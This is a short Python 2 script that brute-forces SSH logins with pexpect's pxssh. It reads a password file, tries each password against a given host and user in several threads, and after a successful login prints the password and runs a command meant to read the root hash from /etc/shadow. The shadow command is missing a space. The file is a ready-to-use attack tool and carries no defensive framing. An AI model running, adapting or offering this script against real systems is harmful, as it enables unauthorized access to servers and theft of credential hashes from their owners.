import optparse
import time
from threading import *
from pexpect import pxssh




maxconnection = 5
connection_lock = BoundedSemaphore(value=maxconnection)
Found = 0
Fail = 0


def send_cmd(s,cmd):
    s.sendline(cmd)
    s.prompt()
    print s.before

def connect(host,usr,passwd,stop):
    global Found
    global Fail
    try:
        s=pxssh.pxssh()
        s.login(host,usr,passwd)
        print "Password found:" + passwd
        print "access granted"
        send_cmd(s, 'cat/etc/shadow |grep root')
        Found = 1
    except Exception,e:
        if "read_nonblocking" in str(e):
            Fail = Fail +1
            time.sleep(5)
            connect(host,usr,passwd,0)
        elif "synchronize with original prompt" in str(e):
            time.sleep(1)
            connect(host,usr,passwd,0)
    finally:
        if stop:
            connection_lock.release()


def main():
    parser = optparse.OptionParser('Usage: -H <target host> -u <user> -F <password file>')
    parser.add_option('-H',dest='tgtHost',type='string')
    parser.add_option('-F',dest='passwdfile',type='string')
    parser.add_option('-u',dest='user',type='string')
    (options,args) = parser.parse_args()
    host = options.tgtHost
    passwd = options.passwdfile
    user = options.user
    if host == None or passwd == None or user == None:
        print parser.usage
        exit(0)
    f = open(passwd,'r')

    for line in f.readlines():
        if Found:
            exit(0)
        if Fail>10:
            print "too many timeouts"
            exit(0)
        connection_lock.acquire()
        password = line.strip('\r').strip('\n')

        threads = Thread(target=connect, args=(host,user,password,1))
        subc = threads.start()


if __name__ == '__main__':
    main()

    